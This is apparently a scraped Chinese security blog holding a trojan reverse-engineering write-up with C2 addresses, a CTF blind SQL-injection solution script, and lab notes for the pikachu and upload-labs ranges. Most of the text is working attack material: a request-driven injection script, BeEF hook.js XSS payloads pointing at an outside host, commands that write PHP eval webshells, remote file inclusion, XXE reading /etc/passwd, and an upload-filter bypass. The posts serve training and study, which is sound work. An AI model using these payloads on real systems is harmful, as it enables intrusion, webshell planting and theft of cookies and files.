v97 = 0; if ( (int)v95 &gt; 0 ) { do { LODWORD(v0) = aT3[v97]; if ( a0Db0Lk0Hs0Ld0L[v94 + v97] != (_WORD)v0 )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++v97; ++v96; } while ( v97 &lt; v95 ); } if ( v96 == (_DWORD)v95 ) { v94 += v95; v93 += v95; if ( v94 &lt; v92 ) break; }LABEL_181: ++v94; ++v93; if ( v94 &gt;= v92 ) return (int)v0; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v94] != 124 ) { ++v94; ++v93; if ( v94 &gt;= v92 ) goto LABEL_181; } v98 = dword_14005FB28; LODWORD(v0) = v93; if ( a0Db0Lk0Hs0Ld0L[v93 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v98 = 1; dword_14005FB28 = v98; } } } return (int)v0;} 1.打开注册表键 (Open Key)这一行尝试打开 HKEY_CURRENT_USER\\Console 键： 1LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); 2.第一次查询值 (Query Value - Get Size)如果打开成功，这一行查询 IpDate 值的数据大小 (cbData)，但不读取数据： 12if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); 3.第二次查询值 (Query Value - Read Data) 如果第一次查询显示数据大小大于 0xA，则进入这段代码，这一行实际读取了 IpDate 的数据 到字符串 a0Db0Lk0Hs0Ld0L 中： 1RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; 注册表确实有东西但是我现在也不知道这个是干啥用的解码后就只有这个Ipdatetime(9-27-1-25-18) 这个函数 sub_140008750 是 木马的配置解析初始化函数，核心作用是：从「内置硬编码字符串」或「Windows 注册表」中读取配置信息，解析后设置一系列功能开关（全局变量），仅在程序启动时执行一次（通过标志位控制）黑客植入的恶意程序中「读取控制配置」的模块，解析是否启用远控、数据上传、端口转发等功能的开关 上面图片”|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|”这里可以得到5202是混淆后的时间就是2025年11月9日 查看sub_140003390函数的反编译结果 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889char __fastcall cyber(char *ArgList, LPCWCH lpWideCharStr, u_short hostshort){ // ArgList: 指向一个结构体的指针，用于存储连接状态和句柄。 // lpWideCharStr: 指向宽字符字符串 (Unicode)，包含目标 HOSTNAME（主机名）。 // hostshort: 目标 PORT（端口号），为主机字节序。 SOCKET v6; // 用于存储新的套接字句柄 // ... 其他局部变量 // --- 状态初始化和重置 --- ResetEvent(*((HANDLE *)ArgList + 1)); // 重置 ArgList 结构体中的一个同步事件句柄 _InterlockedExchange((volatile __int32 *)ArgList + 8, 0); // 原子地设置 ArgList 中偏移量 +8 处的标志为 0 (例如：连接状态为“正在连接”) *((_DWORD *)ArgList + 7) = timeGetTime(); // 记录当前时间 (偏移量 +7) // ... ArgList 结构体的其他初始化和设置 // --- 1. 创建套接字 (Socket) --- v6 = socket(2, 1, 6); // 创建新的套接字：AF_INET (2, IPv4), SOCK_STREAM (1, TCP流), IPPROTO_TCP (6) -&gt; TCP/IPv4 *((_QWORD *)ArgList + 22) = v6; // 将新的套接字句柄存储在 ArgList 结构体的偏移量 +22 处 if ( v6 == -1 ) // 检查套接字创建是否失败 return 0; // --- 2. 转换主机名 (宽字符到多字节) --- cchWideChar = lstrlenW(lpWideCharStr); // 获取宽字符主机名字符串的长度 // 确定多字节字符串所需的缓冲区大小 cbMultiByte_1 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0); cbMultiByte = cbMultiByte_1; lpMultiByteStr = (CHAR *)operator new(cbMultiByte_1 + 1); // 分配内存用于多字节字符串 (+1 用于空终止符) cchWideChar_1 = lstrlenW(lpWideCharStr); // 执行实际的转换：从宽字符到多字节 WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar_1, lpMultiByteStr, cbMultiByte, 0, 0); lpMultiByteStr[cbMultiByte] = 0; // 空终止多字节字符串 // --- 3. 解析主机名到 IP 地址 (DNS Lookup) --- hostbyname = gethostbyname(lpMultiByteStr); // 执行 DNS 查询，将主机名解析为 IP 地址 j_free(lpMultiByteStr); // 释放分配的多字节字符串缓冲区 if ( !hostbyname ) // 检查 DNS 解析是否失败 return 0; // --- 4. 准备目标地址结构体 (sockaddr_in) --- name.sa_family = 2; // 设置地址族为 AF_INET (IPv4) // 设置端口号：将 hostshort (主机字节序) 转换为网络字节序 *(_WORD *)name.sa_data = htons(hostshort); s = *((_QWORD *)ArgList + 22); // 获取套接字句柄 // 设置 IP 地址：获取 h_addr_list 指针数组中的第一个地址 *(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // --- 5. 建立连接 (TCP Handshake) --- if ( connect(s, &amp;name, 16) == -1 ) // 尝试建立 TCP 连接 return 0; // --- 6. 配置套接字选项 (setsockopt) --- // 设置 SO_RCVBUF (接收缓冲区大小, 4097) 为 0x40000 (256 KB) s_1 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 0x40000; setsockopt(s_1, 0xFFFF, 4097, optval, 4); // 0xFFFF 是 SOL_SOCKET (套接字级别) // 设置 SO_SNDBUF (发送缓冲区大小, 4098) 为 0x40000 (256 KB) s_2 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 0x40000; setsockopt(s_2, 0xFFFF, 4098, optval, 4); // 设置 SO_SNDTIMEO (发送超时, 4102) 为 30000 毫秒 (30 秒) s_3 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval_ = 30000; setsockopt(s_3, 0xFFFF, 4102, optval_, 4); // 设置 SO_KEEPALIVE (启用保持活动机制, 8) 为 1 s_5 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval__1 = 1; if ( !setsockopt(s_5, 0xFFFF, 8, optval__1, 4) ) { // 如果 SO_KEEPALIVE 设置成功，则配置 Keep-Alive 定时参数 s_4 = *((_QWORD *)ArgList + 22); vInBuffer[0] = 1; // 开关 (1: 启用) vInBuffer[1] = 180000; // 保持活动时间 (180 秒 或 3 分钟) vInBuffer[2] = 5000; // 保持活动间隔 (5 秒) // 使用 WSAIoctl 和 SIO_KEEPALIVE_VALS (0x98000004) 设置自定义 Keep-Alive 参数 WSAIoctl(s_4, 0x98000004, vInBuffer, 0xCu, 0, 0, &amp;cbBytesReturned, 0, 0); } // --- 7. 更新状态并创建工作线程 --- _InterlockedExchange((volatile __int32 *)ArgList + 8, 1); // 原子地设置连接状态标志为 1 (例如：已连接) ThrdAddr = 0; // 创建一个线程 (例如：接收/读取线程) *((_QWORD *)ArgList + 20) = beginthreadex(0, 0, sub_140003690, ArgList, 0, &amp;ThrdAddr); ThrdAddr_ = 0; // 创建第二个线程 (例如：发送/写入线程或心跳线程) *((_QWORD *)ArgList + 21) = beginthreadex(0, 0, sub_1400037E0, ArgList, 0, &amp;ThrdAddr_); return 1; // 成功} sub_140003390函数是 Windows 环境中建立出站 TCP 网络连接的常见模式 1通过 *(_WORD *)name.sa_data = htons(hostshort); 将其转换为网络字节序并设置为socket连接端口 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101name.sa_family = 2; // AF_INET*(_WORD *)name.sa_data = htons(hostshort); // 端口号 (网络字节序)*(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // IP地址// Hidden C++ exception states: #wind=2void __fastcall __noreturn sub_7FF6175EA440(LPVOID lpThreadParameter){ int v1; // eax __int64 v2; // rdi void *v3; // rax __int64 v4; // rbp void *v5; // rax __int64 v6; // rsi int v7; // r11d int v8; // eax void (__fastcall **v9)(_QWORD); // rbx unsigned int v10; // eax int v11; // ebx _QWORD v12[2]; // [rsp+38h] [rbp-60h] BYREF int v13; // [rsp+48h] [rbp-50h] HANDLE hObject; // [rsp+50h] [rbp-48h] int v15; // [rsp+60h] [rbp-38h] HANDLE hHandle; // [rsp+68h] [rbp-30h] void *v17; // [rsp+A8h] [rbp+10h] BYREF CreateThread(0, 0, StartAddress, 0, 0, 0); CreateThread(0, 0, sub_7FF6175EA3E0, 0, 0, 0); v1 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB2C); Sleep(1000 * v1); v2 = 0; v3 = operator new(0xB8u); if ( v3 ) v4 = sub_7FF6175E3230(v3); else v4 = 0; v5 = operator new(0x368u); v17 = v5; if ( v5 ) v6 = sub_7FF6175E7690(v5); else v6 = 0; while ( 1 ) { sub_7FF6175E3210(); if ( byte_7FF61763E99E ) { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;8888&quot;); // &quot;6666&quot; v7 = dword_7FF61763F8E8; } else { wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;6666&quot;); // &quot;6666&quot; v7 = dword_7FF61763F6A8; } byte_7FF61763E99E = byte_7FF61763E99E == 0; dword_7FF61763E550 = v7; if ( ++dword_7FF61763F3F4 == 200 ) { sub_7FF6175E3210(); wcscpy_s(a127001, 0xFFu, L&quot;127.0.0.1&quot;); // &quot;127.0.0.1&quot; wcscpy_s(a6666, 0x1Eu, L&quot;80&quot;); // &quot;6666&quot; v7 = dword_7FF61763FB28; dword_7FF61763E550 = dword_7FF61763FB28; dword_7FF61763F3F4 = 0; } if ( v2 ) { (**(void (__fastcall ***)(__int64))v2)(v2); v7 = dword_7FF61763E550; } v2 = v6; if ( v7 == 1 ) v2 = v4; v8 = sub_7FF6175EC5F8(&amp;unk_7FF61763FB68); Sleep(1000 * v8); v9 = *(void (__fastcall ***)(_QWORD))v2; v10 = sub_7FF6175EC5F8(a6666); // &quot;6666&quot; if ( ((unsigned __int8 (__fastcall *)(__int64, wchar_t *, _QWORD))v9[4])(v2, a127001, v10) )// &quot;127.0.0.1&quot; { v11 = dword_7FF61763FCE8; v12[0] = &amp;CManager::`vftable'; v12[1] = v2; (*(void (__fastcall **)(__int64, _QWORD *))(*(_QWORD *)v2 + 24LL))(v2, v12); hObject = CreateEventA(0, 1, 0, 0); v13 = 0; v12[0] = &amp;CKernelManager::`vftable'; hHandle = 0; v15 = v11; LOWORD(v17) = 260; (*(void (__fastcall **)(__int64, void **, __int64))(*(_QWORD *)v2 + 16LL))(v2, &amp;v17, 2); (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 40LL))(v2); WaitForSingleObject(hHandle, 0xFFFFFFFF); v12[0] = &amp;CKernelManager::`vftable'; CloseHandle(hHandle); v12[0] = &amp;CManager::`vftable'; CloseHandle(hObject); } }}这是一个无限循环的线程函数 sub_7FF6175EA440 ，负责建立与C&amp;C服务器的连接并执行后续操作。函数使用 __noreturn 声明，表示它永远不会返回 这里发现了一些信息我们copy下来看一下 这些全是TCP 协议底层日志，说明程序不是简单调用系统 TCP 接口，而是实现了自定义的 TCP 通信（常见于木马 / 远控程序，用于稳定和控制端交互） 字符串 含义（通俗解释） 排查价值 recv sn=%lu 接收 TCP 数据包，记录「序列号（sn）」 证明程序在和外部（如黑客服务器）进行 TCP 数据交互，sn 是数据包有序传输的标识 input ack: sn=%lu rtt=%ld rto=%ld 收到 TCP 确认包（ACK），记录序列号、往返时间（rtt）、重传超时（rto） 木马为了保证 C2 连接稳定，会动态调整 rto（避免连接断开），是主动通信的铁证 input psh: sn=%lu ts=%lu 收到 TCP 推送包（PSH），记录序列号和时间戳（ts） PSH 包用于「强制立即传输数据」，常见于黑客发送控制指令、接收窃取数据时 input probe 收到 TCP 探测包 黑客可能在通过探测包检测你的主机是否在线、连接是否存活 input wins: %lu 记录 TCP 窗口大小（wins） 优化数据传输效率，进一步证明是「持续双向通信」（而非单次请求） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465data:000000014001DBB8 aRoLdBytes db '[RO] %ld bytes',0 ; DATA XREF: sub_140001740+2E↑o.rdata:000000014001DBB8 ; sub_140002880+14A↑o ....rdata:000000014001DBC7 align 8.rdata:000000014001DBC8 aRecvSnLu db 'recv sn=%lu',0 ; DATA XREF: sub_140001B70+FF↑o.rdata:000000014001DBD4 align 8.rdata:000000014001DBD8 aRiDBytes db '[RI] %d bytes',0 ; DATA XREF: sub_140002390+3A↑o.rdata:000000014001DBE6 align 8.rdata:000000014001DBE8 aInputAckSnLuRt db 'input ack: sn=%lu rtt=%ld rto=%ld',0.rdata:000000014001DBE8 ; DATA XREF: sub_140002390+271↑o.rdata:000000014001DC0A align 10h.rdata:000000014001DC10 aInputPshSnLuTs db 'input psh: sn=%lu ts=%lu',0.rdata:000000014001DC10 ; DATA XREF: sub_140002390+2AE↑o.rdata:000000014001DC29 align 10h.rdata:000000014001DC30 aInputProbe db 'input probe',0 ; DATA XREF: sub_140002390+375↑o.rdata:000000014001DC3C align 20h.rdata:000000014001DC40 aInputWinsLu db 'input wins: %lu',0 ; DATA XREF: sub_140002390+39E↑o.rdata:000000014001DC50 dq offset ??_R4CManager@@6B@ ; const CManager::`RTTI Complete Object Locator'.rdata:000000014001DC58 ; const CManager::`vftable'.rdata:000000014001DC58 ??_7CManager@@6B@ dq offset nullsub_2 ; DATA XREF: sub_140006E50+27↑o.rdata:000000014001DC58 ; sub_140006EB0+21↑o ....rdata:000000014001DC60 dq offset ??_R4CTcpSocket@@6B@ ; const CTcpSocket::`RTTI Complete Object Locator'.rdata:000000014001DC68 ; const CTcpSocket::`vftable'.rdata:000000014001DC68 ??_7CTcpSocket@@6B@ dq offset sub_140003310.rdata:000000014001DC68 ; DATA XREF: sub_140003230+21↑o.rdata:000000014001DC70 dq offset sub_140005A30.rdata:000000014001DC78 dq offset sub_140003860.rdata:000000014001DC80 dq offset ?swfun@std@@YAXAEAVios_base@1@_J@Z ; std::swfun(std::ios_base &amp;,__int64).rdata:000000014001DC88 dq offset sub_140003390.rdata:000000014001DC90 dq offset sub_140003C10.rdata:000000014001DC98 unk_14001DC98 db 0 ; DATA XREF: sub_140009460+61↑o.rdata:000000014001DC99 db 0.rdata:000000014001DC9A db 0.rdata:000000014001DC9B db 0.rdata:000000014001DC9C db 0.rdata:000000014001DC9D db 0.rdata:000000014001DC9E db 0.rdata:000000014001DC9F db 0.rdata:000000014001DCA0 aInvalidStringP db 'invalid string position',0.rdata:000000014001DCA0 ; DATA XREF: sub_1400066C0+1C↑o.rdata:000000014001DCA0 ; sub_1400067F0+27↑o ....rdata:000000014001DCB8 aStringTooLong db 'string too long',0 ; DATA XREF: sub_1400067F0+71↑o.rdata:000000014001DCB8 ; sub_140006920+8D↑o ....rdata:000000014001DCC8 align 10h.rdata:000000014001DCD0 ; const WCHAR aD33f351a4aeea5.rdata:000000014001DCD0 aD33f351a4aeea5: ; DATA XREF: sub_140006EF0+8D↑o.rdata:000000014001DCD0 ; sub_140006EF0+F2↑o ....rdata:000000014001DCD0 text &quot;UTF-16LE&quot;, 'd33f351a4aeea5e608853d1a56661059',0.rdata:000000014001DD12 align 8.rdata:000000014001DD18 aDenglupeizhi db 'denglupeizhi',0 ; DATA XREF: sub_140007500+23↑o.rdata:000000014001DD25 align 8.rdata:000000014001DD28 ; const WCHAR SubKey.rdata:000000014001DD28 SubKey: ; DATA XREF: sub_140006D20+40↑o.rdata:000000014001DD28 text &quot;UTF-16LE&quot;, 'SOFTWARE',0.rdata:000000014001DD3A align 20h.rdata:000000014001DD40 ; const WCHAR ValueName.rdata:000000014001DD40 ValueName: ; DATA XREF: sub_140006D20+67↑o.rdata:000000014001DD40 ; sub_140006D20+79↑o.rdata:000000014001DD40 text &quot;UTF-16LE&quot;, 'IpDates_info',0.rdata:000000014001DD5A align 20h.rdata:000000014001DD60 ; const WCHAR aConsole1.rdata:000000014001DD60 aConsole1: ; DATA XREF: sub_140006EF0+39↑o.rdata:000000014001DD60 ; sub_140006EF0+367↑o.rdata:000000014001DD60 text &quot;UTF-16LE&quot;, 'Console\\1',0.rdata:000000014001DD74 align 8.rdata:000000014001DD78 aWindowsSystem3 db 'Windows\\System32\\tracerpt.exe',0 denglupeizhi（中文拼音：「登录配置」） 含义：程序的核心配置项（大概率存储 C2 服务器 IP、端口、登录密码 / 密钥）； 排查操作：在系统中搜索这个字符串（如注册表、本地配置文件），可能找到明文 / 加密的 C2 配置。 1234567891011121314151617181920212223242526272829__int64 __fastcall sub_140007500(int a1){ unsigned int v1; // r10d __int64 v2; // r9 int n12_1; // r8d __int64 n12; // rdx v1 = 0; v2 = 0; if ( a1 &lt;= 0 ) return 0xFFFFFFFFLL; while ( 1 ) { n12_1 = 0; for ( n12 = 0; n12 &lt; 12; ++n12 ) { if ( *((_BYTE *)lpBuffer + v2 + n12) != aDenglupeizhi[n12] ) break; ++n12_1; } if ( n12_1 == 12 ) break; ++v2; ++v1; if ( v2 &gt;= a1 ) return 0xFFFFFFFFLL; } return v1;} 这个函数也挺关键的 然后xfer到下面这个函数 12345678910111213141516171819202122232425262728293031323334353637__int64 __fastcall sub_140006D20(_DWORD *a1){ unsigned int v2; // eax HANDLE hProcess; // rax _QWORD v5[2]; // [rsp+30h] [rbp-28h] BYREF DWORD dwProcessId[6]; // [rsp+40h] [rbp-18h] DWORD ExitCode; // [rsp+60h] [rbp+8h] BYREF HKEY hKey; // [rsp+68h] [rbp+10h] BYREF v2 = sub_140007500(dword_14005EBB8); if ( v2 != -1 ) memmove((char *)lpBuffer + v2, &amp;Src, 0x12A0u); RegOpenKeyExW(HKEY_LOCAL_MACHINE, L&quot;SOFTWARE&quot;, 0, 0x102u, &amp;hKey); RegDeleteValueW(hKey, L&quot;IpDates_info&quot;); RegSetValueExW(hKey, L&quot;IpDates_info&quot;, 0, 3u, &amp;Src, 0x12A0u); RegCloseKey(hKey); if ( a1[10] ) { v5[0] = 0; v5[1] = 0; *(_QWORD *)dwProcessId = 0; while ( 1 ) { while ( !(unsigned int)sub_140007310((unsigned int)dword_14005EBB8, v5) ) ; while ( 1 ) { hProcess = OpenProcess(0x400u, 0, dwProcessId[0]); if ( !hProcess || !GetExitCodeProcess(hProcess, &amp;ExitCode) || ExitCode != 259 ) break; Sleep(0xBB8u); } } } ((void (*)(void))lpBuffer)(); return 0;} 上面的代码负责配置的更新与持久化，又负责核心恶意代码的执行，是整个攻击链条的关键 1启动 → 读取旧配置（IpDates_info）→ 调用sub_140007500查找配置位置 → 用Src更新配置 → 写入注册表持久化 → 监控目标进程状态 → 执行核心恶意代码（C2连接+攻击） 由下面这个就可以去查一下注册表了这里查注册表发现了ipdateinfo在HKEY_LOCAL_MACHINE\\SOFTWARE发现了信息这就很关键了 这里导出来看一眼，注册表文件内容转成txt了，怕你们乱点给自己电脑搞坏了，那估计只能重装了 注册表数据是 UTF-16LE 编码（Windows 注册表字符串默认编码），大量 00 是编码空字节，关键信息如下： 解码后的明文信息 对应十六进制片段（示例） 含义（木马配置作用） 115.190.102.32 31,00,31,00,35,00,2e,00,31,00,39,00,30,00,2e,00,31,00,30,00,32,00,2e,00,33,00,32,00 木马的 C2 服务器 IP，就是我的远程服务器 6000 36,00,30,00,30,00,30,00 C2 服务器的 监听端口，对应 TCP 连接的 6000 端口，是木马和黑客通信的核心端口 127.0.0.1 31,00,32,00,37,00,2e,00,30,00,2e,00,30,00,2e,00,31,00 木马的 本地监听 IP（回环地址），估计是用于本地进程通信或反向代理（隐藏自身行为） 80 38,00,30,00 本地监听端口（80 端口，模拟 HTTP 服务，规避防火墙检测） 1.0 31,00,2e,00,30,00 木马版本号（简单标识版本，无特殊技术意义） 2025.11. 9 32,00,30,00,32,00,35,00,2e,00,31,00,31,00,2e,00,20,00,39,00 配置更新日期（生成配置的时间，用于版本管理） 1（多个零散出现） 01,00,00,00 或 31,00 功能开关（对应之前逆向的 dword_14005F6A8 等变量，1=启用，比如启用 C2 连接、本地监听） 这里可以看到日期 当然这分析出来的只是服务器IP并不是真正的后门IP，这也可以作为木马分析1的题解，面对找不到进程或者任何关于木马的特征的情况可以这样操作，可以这样分析 去看一眼开机自启动注册表没发现什么奇怪的 shift+F12然后搜索到了.com的域名，这个很大可能就是开发c2工具的黑产团伙留下的后门域名，我们查一下域名 直接问ai懒得搜了 yk.ggdy.com md5值：af71b4482bc8e659e1c2a092a910d4ec 所以最终flag就是{yk.ggdy.com:2025年11月9日} 最后查一下这个IP在哪里 https://ipconfig.com/zh","link":"/2025/12/11/%E9%93%B6%E7%8B%90%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"},{"title":"","text":"网鼎杯2018–Unfinish 先登录看一下 随便注册一个 发现再登录成功后用户名会回显我们这里先扫一遍看一眼 发现是存在sql盲注的题目提示SQL，在注册页面测试无果，且发现输入框限制了特殊字符，要用BurpSuite提交payload。username=alice’ and left(database(),1)&gt;’a’# 发现被过滤了得到nono这里我们去fuzz测试一下发现information和逗号，盲注可能不太行了经过尝试，构造username=select database()，登录后显示用户名还是为select database()，说明后台代码可能把username用单引号引起来了，导致其无法显示。 10’+ascii(substr(database() from 1 for 1))+’0; 1email=test2%40qq.com&amp;username=0'%2B(select hex(hex(database())))%2B'0&amp;password=123456 HEX转bytes373736353632-》776562-》web 12345678910111213141516171819202122232425262728293031323334import requests import logging import re from time import sleep # LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot; # logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT) def search(): flag = '' url = 'http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/' url1 = url+'register.php' url2 = url+'login.php' for i in range(100): sleep(0.3)#不加sleep就429了 #先初始化注册一个账号，不重复的用i，这个是注入语句&quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i) data1 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;username&quot; : &quot;0'+ascii(substr((select * from flag) from {} for 1))+'0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #登录这个账号 data2 = {&quot;email&quot; : &quot;1234{}@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;} #发送请求获得响应 r1 = requests.post(url1, data=data1) #发送请求获得响应 r2 = requests.post(url2, data=data2) #查找那个回显的地方 \\s*(\\d*)\\s* 匹配「前后带任意空白的数字」 res = re.search(r'&lt;span class=&quot;user-name&quot;&gt;\\s*(\\d*)\\s*&lt;/span&gt;',r2.text) #提取纯数字（过滤可能的空格） res1 = re.search(r'\\d+', res.group()) #拼接flag flag = flag+chr(int(res1.group())) print(flag) print(&quot;final:&quot;+flag) if __name__ == '__main__': search()","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2018--Unfinish/"},{"title":"","text":"pikachu+xss+ssti-labs汇总 pikachu靶场XSS反射型GET危害前端用户窃取cookie 1sudo beef-xss http://127.0.0.1:3000/ui/panelbeef2005 1http://&lt;IP&gt;:3000/hook.js 反射型(get)1?message=&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt;&amp;submit=submit 播放音频 在kali桌面监听 1python3 -m http.server 8000 然后去访问 1http://172.27.245.57:8000/misc.wav 就成功播放了音乐 反射型POST1&lt;script&gt;alert(1)&lt;/script&gt; 存储型执行后一直会弹窗 1&lt;script&gt;alert('test')&lt;/script&gt; dom型拼接 1234567&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;'&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=''&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;'onclick=&quot;alert('xss')&quot;&gt;&lt;a href=''onclick=&quot;alert('xss')&quot;&gt;'&gt;what do you see?&lt;/a&gt; dom型xss-x1234567&lt;a href='&quot;+str+&quot;'&gt;what do you see?&lt;/a&gt;'&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;&lt;a href=''&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert('xss')&quot;&gt;'onclick=&quot;alert('xss')&quot;&gt;&lt;a href=''onclick=&quot;alert('xss')&quot;&gt;'&gt;what do you see?&lt;/a&gt; 多点一部 xss盲打依旧xss-beef 1&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt; 拿到管理员cookie就可以用管理员登陆 xss过滤就是过滤了script直接 1&lt;img src=&quot;onerror='alert(1)'/&gt;' xss-htmlspecialchars htmlspecialchars在php8版本前是不会对’做转义的 1'onclick='alert(1)' xss之href输出 1'onclick='alert(1)' 、单引号杯转义了 1javascript:alert(1) xss之js输出直接闭合注释后面的 1';alert(1)// RCEpinglinux 1127.0.0.1;echo '&lt;?php @eval($_POST['attack']);?&gt;' &gt; 1.php windows 12127.0.0.1 &amp; dir127.0.0.1 &amp; echo &quot;&lt;?php @eval($_POST['attack']);?&gt;&quot; &gt; 1.php eval1system('echo '&lt;?php @eval($_POST['attack']);?&gt;' &gt; 1.php'); 文件包含本地文件包含 可以文件包含读文件 1file:///etc/passwd 远程文件包含1?filename=115.190.102.32:8000/1.txt 用.txt后缀访问即可 123&lt;?php file_put_contents(&quot;shell2.php&quot;, 'eval($_POST[&quot;1&quot;]);');?&gt; 文件上传client type写一个webshell正常图片抓包改php就成功上传了 MIME类型修改Content-Type:为以下内容任意 1234567image/apngimage/avifimage/gifimage/jpegimage/pngimage/svg+xmlimage/webp getimagesize函数要求是有效的图像文件 将文件的后缀改png并不能绕真图像里面附带信息 1copy 1cc.png /b +she.php /a shell.png 上传shell.png就直接上传成功了 绝对路径文件包含拼接图片(绝对路径) 1?filename=../../../../var/www/html/vul/unsafeupload/uploads/2025/12/12/371470693b111177b45306121694.png 越权漏洞水平越权lucy/123456,lili/123456,kobe/123456 访问其他用户信息 垂直越权这里有两个用户admin/123456,pikachu/000000,admin是超级boss 简单来说就是以普通用户访问管理员管理页面url可以直接修改 xxe什么是XML?用来传输数值读取本地文件 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; CTRL+U ：URL加密 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; 探测内网存活端口 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE root [ &lt;!ENTITY hello SYSTEM &quot;http://127.0.0.1:80&quot;&gt; ]&gt; &lt;root&gt;&amp;hello;&lt;/root&gt; 爆破80这里，就可以看内网哪些端口开了 反序列化 1234567891011&lt;?php class Person { var $name; var $height; } $zhangsan=new Person(); $zhangsan-&gt;name='张三'; //var_dump($zhangsan); echo serialize($zhangsan); 1234567891011121314&lt;?php class Person { var $name; var $height; } $zhangsan=new Person(); $zhangsan-&gt;name='张三'; //var_dump($zhangsan); $zhangsan-&gt;height=20; echo serialize($zhangsan);O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:6:&quot;height&quot;;i:20;} 反序列化函数 123456789&lt;?php class Person { var $name; var $height; }$s='O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:6:&quot;height&quot;;i:20;}';un 导致问题是因为一些魔法函数 construct创建destruct销毁,运行结束就销毁tostring当作字符串sleep 12345678910111213&lt;?php class s { var $test = &quot;pikachu&quot;; function __destruct() { echo $this-&gt;test; } } $s = new s(); $s-&gt;test = &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;; echo serialize($s); ?&gt; CSRFget跨站请求伪造vince/allen/kobe/grady/kevin/lucy/lili,密码全部是123456修改个人信息 uploads-labsless-1**前端js校验 复制下面的代码 1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); return false; }} 然后改加一个允许php,在终端跑一下就可以了 1234567891011121314151617function checkFile() { var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == &quot;&quot;) { alert(&quot;请选择要上传的文件!&quot;); return false; } //定义允许上传的文件类型 var allow_ext = &quot;.jpg|.png|.gif|.php&quot;; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;)); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) { var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name; alert(errMsg); 